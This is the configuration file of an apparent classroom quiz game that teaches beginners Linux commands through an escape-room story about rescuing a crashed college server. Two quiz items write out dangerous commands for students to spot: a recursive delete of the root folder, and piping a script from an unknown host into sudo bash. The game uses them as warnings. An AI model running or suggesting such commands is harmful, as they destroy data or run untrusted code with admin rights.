// Linux Command Quest (EduMoon Coding Club). For 1st year onwards.
// Escape-room style: a broken college server, a terminal and 6 rooms. Pick the right command to move on.
// Commands are standard Linux/bash, safe for beginners. Students can practise later on any Linux terminal or an online one.
// Step types used: story · rules · learn · door · speak · offer · wordlist · end

const LQ = (round, name, extra) => Object.assign({ type: "door", kind: "choice", time: 40, board: false, eyebrow: `Room ${round} · ${name}` }, extra);
// "Find the dangerous / wrong command" questions use the bug door.
const DANGER = { kind: "bug", time: 60, step1: "What’s wrong?", step2: "Tap the wrong command", say1: "First pick the problem.", say2: "Now tap the wrong command.", partO: "the problem", partL: "the line", lineLabel: "line", bugLabel: "The wrong line is" };

const CHEAT = [
  ["pwd", "Where am I? Prints the current folder."],
  ["ls  /  ls -a  /  ls -l", "List files. -a shows hidden ones, -l shows details."],
  ["cd folder  /  cd ..  /  cd ~", "Go into a folder, go up one, go home."],
  ["mkdir  /  touch", "Make a folder. Make an empty file."],
  ["cp  /  mv  /  rm", "Copy. Move or rename. Delete (no recycle bin!)."],
  ["cat  /  head  /  tail  /  less", "Read a file: all of it, the start, the end, or page by page."],
  ["grep \"word\" file", "Find lines containing a word."],
  ["chmod +x  /  ./script.sh", "Make a script runnable. Run it."],
  ["df -h  /  top  /  kill", "Disk space. Running programs. Stop a program."],
  ["man command  /  command --help", "Read the manual. Your best friend."]
];

window.GAME = {
  id: "linux-quest",
  title: "Linux Command Quest",
  club: "Coding Club",
  tagline: "A broken server. A blinking cursor. Six rooms. Type your way out.",
  art: window.STORY_ART,
  guide: {
    years: "1st year onwards · no Linux experience needed", time: "40 minutes", level: "Beginner",
    about: "An escape-room game set inside a college server’s terminal. Teams move through 6 rooms (finding their way, moving around, managing files, reading logs, permissions and running scripts, and rescuing the server) by picking the right Linux command. They catch dangerous commands before they run and leave with a 10-line Linux cheat sheet. Every command is real and safe to practise later.",
    outcomes: "The 20 most-used Linux commands, how to read and search log files, what permissions and sudo mean, and which commands to be careful with.",
    tone: "Play up the escape-room story: “the server is down, the fest website is offline, only you can fix it.” Show each command on screen after the reveal and explain it in one sentence. If you have a laptop, open a terminal and run the safe commands live.",
    extra: [["Practise later", "Students can try every command on any Linux machine, a Mac terminal, WSL on Windows, or a free online Linux terminal in the browser."], ["Safety", "Never run rm -rf on anything you’re not 100% sure about. The game teaches this on purpose."]]
  },
  words: {
    round: "Room", unlocked: "Command", badgeLabel: "Unlocked",
    rulesEyebrow: "How Linux Command Quest works", rulesTitle: "Read the task. Pick the command. Escape the room.",
    learnText: "The host shows the commands for this room.", crackTitle: "Type it",
    crackText: "Pick the right command on your phone and lock it in.",
    rulesExtra: "Danger questions: <b>100</b> for the problem + <b>100</b> for the line. Room 6: <b>double</b>!",
    nobody: "Nobody escaped this room. Even sysadmins look this one up!", cracked: "escaped",
    next: "Next room →", finale: "Next →", winner: "rescued the server!", endLine: "Server back online. You’re a terminal hero!"
  },
  offerEyebrow: "EduMoon Coding Club · Terminal results",
  offerTitle: "Your terminal rank",
  offers: [
    { min: 0.7, icon: "crown", title: "Root User", text: "The terminal is your home. Try Git Rescue next." },
    { min: 0.45, icon: "code", title: "Power User", text: "Strong! Practise 5 commands on a real terminal this week." },
    { min: 0.2, icon: "route", title: "Explorer", text: "Good start. Learn pwd, ls and cd by heart first." },
    { min: 0, icon: "book-open", title: "New User", text: "Everyone starts here. Save the cheat sheet and try it tonight." }
  ],
  steps: [
    {
      type: "story", art: true,
      alert: "EduMoon Coding Club · Linux Command Quest",
      title: "The college fest website just crashed. The server has no buttons, only a terminal and a blinking cursor. Six rooms stand between you and getting it back online.",
      cards: [["code", "Real Linux commands, no experience needed"], ["shield", "Spot dangerous commands before they run"], ["trophy", "Escape 6 rooms and save the fest"]]
    },
    { type: "rules" },

    // ---------- Room 1: Where am I? ----------
    {
      type: "learn", door: 1,
      title: "Room 1: Where am I?",
      points: [["pwd", "Print working directory: shows which folder you’re in"], ["ls", "List: shows the files and folders here"], ["cd folder", "Change directory: go into a folder"]],
      highlightLast: true,
      side: { label: "Try it", items: [["code", "$ pwd", "/home/student"], ["code", "$ ls", "notes  projects  fest-site"], ["code", "$ cd fest-site", "now you’re inside"]] }
    },
    LQ(1, "Where Am I?", {
      prompt: "You just logged in and have no idea which folder you’re in. Which command tells you?",
      options: ["ls", "pwd", "cd", "where"], answer: 1,
      hint: "Print working directory.",
      note: "pwd prints your current folder, like /home/student.", badge: "map"
    }),
    LQ(1, "Where Am I?", {
      prompt: "Which command shows the files and folders in your current folder?",
      options: ["show", "dir --all", "ls", "open"], answer: 2,
      hint: "Two letters, short for list.",
      note: "ls lists what’s inside the current folder.", badge: "list-checks"
    }),
    LQ(1, "Where Am I?", {
      prompt: "ls shows a folder called fest-site. How do you go inside it?",
      code: ["$ ls", "notes  projects  fest-site"],
      options: ["cd fest-site", "go fest-site", "open fest-site", "ls fest-site"], answer: 0,
      hint: "Change directory.",
      note: "cd fest-site moves you into that folder. (ls fest-site would only list what’s inside.)", badge: "route",
      board: true, boardLabel: "after Room 1"
    }),

    // ---------- Room 2: Moving around ----------
    {
      type: "learn", door: 2,
      title: "Room 2: moving around.",
      points: [["cd ..", "Go up one folder"], ["cd ~", "Go to your home folder from anywhere"], ["ls -a", "Show hidden files too (names starting with a dot)"]],
      highlightLast: true,
      side: { label: "Shortcuts", items: [["code", "..", "the folder above"], ["code", "~", "your home folder"], ["code", ".env", "a hidden file"]] }
    },
    LQ(2, "Moving Around", {
      prompt: "You’re in /home/student/fest-site/images. Which command takes you up to /home/student/fest-site?",
      options: ["cd up", "cd ..", "cd /", "back"], answer: 1,
      hint: "Two dots mean the folder above.",
      note: "cd .. moves up one level. cd / would jump all the way to the root of the whole system.", badge: "route"
    }),
    LQ(2, "Moving Around", {
      prompt: "You’re lost deep inside many folders. One command to jump straight back to your home folder?",
      options: ["cd ~", "home", "cd ...", "exit"], answer: 0,
      hint: "The wavy symbol.",
      note: "cd ~ (or just cd) takes you home from anywhere.", badge: "map"
    }),
    LQ(2, "Moving Around", {
      prompt: "The config file .env is hidden. ls doesn’t show it. Which command does?",
      options: ["ls -h", "ls hidden", "ls -a", "show .env"], answer: 2,
      hint: "a for all.",
      note: "ls -a shows all files, including hidden ones that start with a dot.", badge: "eye",
      board: true, boardLabel: "after Room 2"
    }),

    // ---------- Room 3: Files and folders ----------
    {
      type: "learn", door: 3,
      title: "Room 3: making, copying, moving and deleting.",
      points: [["mkdir name / touch file", "Make a folder / make an empty file"], ["cp a b / mv a b", "Copy / move or rename"], ["rm file", "Delete. There is NO recycle bin"]],
      highlightLast: true,
      side: { label: "Careful!", items: [["shield", "rm is permanent", "Double-check the name"], ["code", "mv old new", "is also how you rename"], ["code", "cp -r", "to copy a whole folder"]] }
    },
    LQ(3, "Files", {
      prompt: "Make a new folder called backup.",
      options: ["touch backup", "mkdir backup", "new backup", "cd backup"], answer: 1,
      hint: "Make directory.",
      note: "mkdir makes a folder. touch makes an empty file.", badge: "list-checks"
    }),
    LQ(3, "Files", {
      prompt: "Rename index_old.html to index.html. Which command?",
      options: ["rename index_old.html index.html", "cp index_old.html", "mv index_old.html index.html", "rm index_old.html index.html"], answer: 2,
      hint: "Move to a new name.",
      note: "mv moves a file, and moving it to a new name in the same folder renames it.", badge: "pen-tool"
    }),
    LQ(3, "Files", Object.assign({}, DANGER, {
      prompt: "A teammate’s plan to clean up the server. Which command is dangerous?",
      code: ["cd ~/fest-site", "mkdir backup", "cp -r images backup/", "rm -rf /"],
      outputOptions: ["Nothing, all safe", "It’s too slow", "It tries to delete everything on the whole system, starting from the root"], outputAnswer: 2, bugLine: 3,
      bugText: "rm -rf / means: delete everything, from the very top, without asking. Never run it",
      hint: "What does / alone mean?",
      note: "rm -rf deletes without asking and / is the whole system. Always check what comes after rm.", badge: "shield",
      board: true, boardLabel: "after Room 3"
    })),
    { type: "speak", eyebrow: "Speaking time · optional", prompt: "Explain to the room what “cd ..” and “ls -a” do, in your own words.", note: "20 seconds. Simple words win.", points: 100 },

    // ---------- Room 4: Reading logs ----------
    {
      type: "learn", door: 4,
      title: "Room 4: read the logs to find the crash.",
      points: [["cat file", "Print the whole file"], ["head / tail", "First 10 lines / last 10 lines (tail -n 20 for 20)"], ["grep \"word\" file", "Show only lines that contain the word"]],
      highlightLast: true,
      side: { label: "Log detective", items: [["code", "tail error.log", "newest errors are at the end"], ["code", "grep \"ERROR\" app.log", "just the errors"], ["code", "less big.log", "scroll page by page, q to quit"]] }
    },
    LQ(4, "Read the Logs", {
      prompt: "The log file is huge. The newest messages are at the END. Which command shows the last lines?",
      options: ["head error.log", "tail error.log", "end error.log", "top error.log"], answer: 1,
      hint: "Head is the start. The end is the…",
      note: "tail shows the last 10 lines. tail -f even keeps showing new lines as they come in.", badge: "file-text"
    }),
    LQ(4, "Read the Logs", {
      prompt: "Show only the lines in app.log that contain the word ERROR.",
      options: ["find ERROR app.log", "cat ERROR", "grep \"ERROR\" app.log", "ls ERROR app.log"], answer: 2,
      hint: "The search command.",
      note: "grep searches inside files for a word or pattern. It’s one of the most useful commands.", badge: "search"
    }),
    LQ(4, "Read the Logs", {
      kind: "number",
      prompt: "How many lines will this command print?",
      code: ["$ grep \"ERROR\" app.log", "", "app.log contains:", "INFO  server started", "ERROR disk almost full", "INFO  user login", "ERROR database timeout", "WARN  slow request", "ERROR disk full"],
      answer: 3,
      hint: "Count the lines that contain ERROR.",
      note: "3 lines contain ERROR. And look: the disk is full. That’s why the site crashed!", badge: "list-checks",
      board: true, boardLabel: "after Room 4"
    }),

    // ---------- Room 5: Permissions and scripts ----------
    {
      type: "learn", door: 5,
      title: "Room 5: permissions, scripts and sudo.",
      points: [["chmod +x script.sh", "Give permission to run a script"], ["./script.sh", "Run a script in this folder"], ["sudo command", "Run as admin. Powerful, so be careful"]],
      highlightLast: true,
      side: { label: "Permission letters", items: [["code", "r", "read"], ["code", "w", "write"], ["code", "x", "execute (run)"]] }
    },
    LQ(5, "Permissions", {
      prompt: "You try ./cleanup.sh and get “Permission denied”. What’s the fix?",
      code: ["$ ./cleanup.sh", "bash: ./cleanup.sh: Permission denied"],
      options: ["rm cleanup.sh", "chmod +x cleanup.sh", "cd cleanup.sh", "cat cleanup.sh"], answer: 1,
      hint: "Give it execute permission.",
      note: "chmod +x adds the execute permission so the script can run. Read a script before running it!", badge: "lock"
    }),
    LQ(5, "Permissions", {
      prompt: "What does putting sudo before a command do?",
      options: ["Runs it as an administrator, with full power", "Runs it slower", "Undoes it", "Makes it silent"], answer: 0,
      hint: "Super user do.",
      note: "sudo runs a command with admin rights. Great power, great responsibility: one wrong sudo can break the system.", badge: "shield"
    }),
    LQ(5, "Permissions", Object.assign({}, DANGER, {
      prompt: "A random website says to paste this to “speed up” your laptop. Which line should worry you most?",
      code: ["cd ~", "ls", "curl http://unknown-site.xyz/fast.sh | sudo bash", "echo done"],
      outputOptions: ["It downloads an unknown script and runs it as admin, without you reading it", "It’s too short", "Nothing, it’s safe"], outputAnswer: 0, bugLine: 2,
      bugText: "it runs a stranger’s script with full admin power. It could do anything to your system",
      hint: "Who wrote that script?",
      note: "Never pipe an unknown script into sudo. Download it, read it, and only run what you trust.", badge: "shield",
      board: true, boardLabel: "after Room 5"
    })),

    // ---------- Room 6: Rescue the server (double) ----------
    {
      type: "learn", door: 6,
      title: "Final room: rescue the server. Double points!",
      points: [["df -h", "Shows disk space in human-friendly sizes"], ["top (or ps aux)", "Shows running programs and what’s using CPU or memory"], ["kill PID", "Stops a program by its process ID"]],
      highlightLast: true,
      side: { label: "Final room", items: [["zap", "Double points", "Still anyone’s game!"], ["code", "man command", "when you’re stuck"], ["trophy", "Then the server is back", ""]] }
    },
    LQ(6, "Rescue the Server", {
      double: true,
      prompt: "The logs said the disk is full. Which command shows how much disk space is used and free?",
      options: ["ls -l", "df -h", "pwd", "space"], answer: 1,
      hint: "Disk free, human-readable.",
      note: "df -h shows each disk’s size, used and free space, in GB and MB.", badge: "chart-column"
    }),
    LQ(6, "Rescue the Server", {
      double: true,
      prompt: "top shows a runaway program with process ID 4821 eating all the memory. How do you stop it?",
      code: ["  PID  COMMAND       %MEM", " 4821  old-backup    92.0", " 1203  web-server     3.1"],
      options: ["stop old-backup", "rm 4821", "kill 4821", "cd 4821"], answer: 2,
      hint: "Use the process ID.",
      note: "kill 4821 asks that process to stop. Memory is freed, and the web server can breathe.", badge: "zap"
    }),
    LQ(6, "Rescue the Server", {
      double: true,
      prompt: "You forget what options the ls command has. Fastest built-in help?",
      options: ["Restart the server", "Guess", "Delete ls", "man ls  (or ls --help)"], answer: 3,
      hint: "The manual.",
      note: "man shows the manual for any command. Press q to quit. Real engineers use it every day.", badge: "book-open",
      board: true, boardLabel: "after Room 6"
    }),

    { type: "speak", eyebrow: "Final challenge · best one wins +200", prompt: "In 30 seconds: tell the story of how your team rescued the server, using 5 commands.", note: "Say each command and what it did. The host picks the best rescue.", points: 200 },
    { type: "offer" },
    { type: "wordlist", eyebrow: "Take it home", title: "Linux Cheat Sheet", note: "Screenshot this. Try each command on any Linux or Mac terminal.", items: CHEAT },
    {
      type: "end",
      joinTitle: "Join the EduMoon Coding Club",
      joinText: "Coding games, contests and real projects every week. Learn with your college friends.",
      joinButton: "Join the EduMoon community on WhatsApp",
      joinUrl: "https://chat.whatsapp.com/EqrtHVWwh3OI2aFhg6Zz6s"
    }
  ]
};
